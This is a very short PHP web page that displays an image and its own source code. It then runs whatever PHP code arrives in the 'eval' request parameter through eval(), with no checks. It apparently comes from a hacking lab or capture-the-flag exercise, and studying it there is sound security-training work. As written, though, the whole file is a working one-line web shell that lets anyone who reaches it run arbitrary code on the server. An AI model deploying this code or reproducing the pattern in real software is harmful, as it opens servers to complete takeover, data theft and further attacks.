<html><head></head>
<body>
<img src='img/php.jpg'><br> 
<?php
highlight_file(__FILE__);
eval(stripslashes($_REQUEST['eval']));
?>
</body>
</html>
